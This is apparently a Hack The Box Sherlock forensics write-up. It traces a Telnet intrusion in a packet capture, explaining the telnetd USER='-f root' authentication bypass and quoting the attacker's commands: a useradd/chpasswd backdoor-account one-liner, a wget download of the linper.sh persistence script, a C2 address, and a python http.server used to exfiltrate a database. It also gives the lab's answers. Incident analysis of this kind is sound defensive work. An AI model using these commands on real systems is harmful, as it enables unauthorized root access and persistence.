# HTB-Sherlock-Telly-Writeup

## Sherlock Scenario
On January 27, 2026, an external attacker exploited a flaw in the Telnet service to gain unauthorized root access. By injecting a malicious environment variable (`USER=-f root`), the attacker bypassed authentication, created a backdoor account, installed a persistence script, and exfiltrated a sensitive database.

---

### Task 1 What CVE is associated with the vulnerability exploited in the Telnet protocol?**
**Answer:** `CVE-2026-24061`

What is Telnet?

Telnet is an old protocol used to remotely log in to a server and run commands, like SSH. The big difference is that Telnet sends everything in **plain text** — no encryption. This means if you capture Telnet traffic in Wireshark, you can literally read the commands, output, and even usernames typed during the session. This is exactly what makes this Sherlock solvable: the whole attack is visible as readable text inside the packet capture.

In Wireshark, filtering on `telnet` isolates the option negotiation packets. Then follow the **TCP stream**. 

**TCP Stream**: A single back-and-forth conversation between two computers over one connection. In Wireshark, right-click any packet → **Follow → TCP Stream** to see the entire conversation reassembled as readable text, in order, instead of scattered across hundreds of separate packets.

```
telnet
```


<img width="1366" height="445" alt="TELNET" src="https://github.com/user-attachments/assets/530d571f-2167-4d20-9298-22f4c7db0bfd" />

And the distinctive `USER` value `-f root` negotiation string was found in TCP stream. 

<img width="1366" height="670" alt="TCP-stream" src="https://github.com/user-attachments/assets/12c0d040-1f64-4eb2-9a81-1a7f56e6bd0d" />


Normally, when someone logs in over Telnet, their Telnet client sends a `USER` value that is just a plain username, like `bob`. The server passes this value to a program called `login`, which then asks for a password. The bug here is that the Telnet server (`telnetd`) does not check what is inside the `USER` value before handing it to `login`. It just forwards it blindly. The attacker used this to send `-f root` as their `USER` value, instead of a real username. `login` has a real flag called `-f`, which means "this user is already verified, skip the password check." This flag is meant for trusted internal use, not for something typed by a random Telnet client. Because `telnetd` never checked the `USER` value, the attacker's `-f root` string was passed straight to `login` as a command flag. This tricked the system into running as `login -f root`. Which logs the attacker straight in as `root`, with **no password required**. This is called an **argument authentication bypass**. To find the CVE, search for `telnetd USER=-f root CVE` in search engine. This search leads to the specific CVE tracking it: **CVE-2026-24061**.

---

### Task 2 When was the Telnet vulnerability successfully exploited, granting root access?**
**Answer:** `2026-01-27 10:39:28` (UTC)

Filter by `tcp.stream==14 and frame contains "root"`. And set time format to UTC: **View > Time Display Format > UTC Date and Time of Day**

```
tcp.stream==14 and frame contains "root"
```

<img width="1366" height="306" alt="root_access" src="https://github.com/user-attachments/assets/db14a7ca-9af0-40cc-97db-9779fa51f26f" />

This filter searches only inside stream 14 (the attacker's Telnet session) for any packet containing the word "root". The very first result is packet 52, and this is the packet that actually carries the malicious `USER=-f root` value — the exact moment the exploit was sent and the root shell was granted. Reading the Time column on that packet (with UTC display turned on) gives the answer: `2026-01-27 10:39:28`.

---

### Task 3 What is the hostname of the targeted server?**
**Answer:** `backup-secondary`

<img width="1366" height="136" alt="host_name" src="https://github.com/user-attachments/assets/11cc3940-d107-4871-a6c8-3f365f76dca9" />

Follow the same TCP Stream output on `tcp.stream eq 14`. Right after the login banner, server prints `Linux 6.8.0-90-generic (backup-secondary) — the hostname is plaintext in the Telnet session since Telnet isn't encrypted.

---

### Task 4 The attacker created a backdoor account to maintain future access. What username/password?**
**Answer:** `cleanupsvc : YouKnowWhoiam69`

<img width="1366" height="99" alt="Screenshot (backdoor_account_creation)" src="https://github.com/user-attachments/assets/edb40613-87e0-4265-8ba5-7041d23409d5" />

Scrolling down the same TCP stream (`tcp.stream eq 14`), I found bash command typed by the attacker to create a backdoor account  (`sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc: YouKnowWhoiam69" | sudo chpasswd `). This single line creates a new admin-capable user called `cleanupsvc` with the password `YouKnowWhoiam69`, giving the attacker a way back in later.

**Breaking down the bash command:**

- `useradd -m -s /bin/bash cleanupsvc` → creates a new Linux user named `cleanupsvc`, gives them a home folder (`-m`), and sets their default shell to bash (`-s /bin/bash`).
- `echo "cleanupsvc:YouKnowWhoiam69"` → prints the text `username:password` in the format Linux expects.
- `| sudo chpasswd` → pipes that text into the `chpasswd` command, which sets the password for the account in one step.
  
**Backdoor Account**: a hidden or unauthorized user account that an attacker creates so they can log back in later, even if the original vulnerability gets patched.

---

### Task 5 What was the full command used to download the persistence script?**
**Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`

<img width="1366" height="479" alt="Screenshot (linper sh_download)" src="https://github.com/user-attachments/assets/a0a04fad-085e-44e6-b816-c9e9e20c8e31" />

Continuing down `tcp.stream eq 14`, command shows up like `w`, `w`, `g`, `g`, `e`, `e`, `t`, `t` - because Telnet echoes each keystroke individually, resolving to `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` bash command.

**`wget`**: a simple command-line tool used to download files from the internet using a URL. Think of it as "download this file to my computer" typed as a command.

**`linper.sh`**: a known open-source Linux persistence tool, designed to help an attacker stay hidden and maintain access on a compromised server.

---

### Task 6 The attacker installed remote access persistence using the script. What is the C2 IP?**
**Answer:** `91.99.25.54`

<img width="1366" height="178" alt="Screenshot (C2_server_communication)" src="https://github.com/user-attachments/assets/8fbcbb19-5c52-46c3-a639-edf62fbbdd1c" />

Further down the same stream, and reconstructing the interleaved characters resolves to the IP `91.99.25.54`, and  port `5599` — the persistence script's configured C2(Command & Control) IP address.

**Command and Control(C2)**: A remote server used by attackers to maintain persistent access and remotely manage the backdoors they have installed on a compromised system.

---

### Task 7 At what time was the sensitive database file exfiltrated?**
**Answer:** `2026-01-27 10:49:54` (UTC)

<img width="1366" height="106" alt="Screenshot (data_exfilteration)" src="https://github.com/user-attachments/assets/1a88f9f3-8801-4ae5-b53b-9e2021ee24b0" />

In the tcp stream, we can see the attacker running a simple Python web server on the compromised machine (`python -m http.server`), which then logs incoming file requests - ` Serving HTTP on 0.0.0.0 port 6932 ...GET /credit-cards-25-blackfriday.db HTTP/1.1" 200`. `200` means the request succeeded — the file was found and sent. The timestamp on that line is  `2026-01-27 10:49:54 UTC`.

---

### Task 8 Find the credit card number for customer Quinn Harris in the exfiltrated database.**
**Answer:** `5312269047781209`

`Wireshark → File → Export Objects → HTTP`, select the `.db` row and `Save` it to disk. 

<img width="1366" height="642" alt="download-db-from-wireshark" src="https://github.com/user-attachments/assets/e243b89b-9a0d-42de-8d18-07b2fad779a8" />


`credit-cards-25-blackfriday.db` is a SQLite file. I opened the .db and ran this sql query in SQLite DB Browser. 

```
select * from purchases where email like '%quinn%';
```

<img width="1056" height="587" alt="sql-query" src="https://github.com/user-attachments/assets/763761a2-6b1c-4a57-80ed-e2e685eb3da9" />


---

<img width="1366" height="612" alt="Sherlock-Telly-Solved-Badge" src="https://github.com/user-attachments/assets/43587aab-a181-4644-952e-14ee5f90bfdf" />

https://labs.hackthebox.com/achievement/sherlock/2413013/1144

---
## 📬 Contact & Profiles
**LinkedIn:** [risma-fareedh](https://www.linkedin.com/in/risma-fareedh-066a19199) | **Hack The Box:** [HTB Profile](https://profile.hackthebox.com/profile/019d51eb-d379-72f0-ad54-5a4e2121b80b) | **GitHub:** [Risma2025](https://github.com/Risma2025)
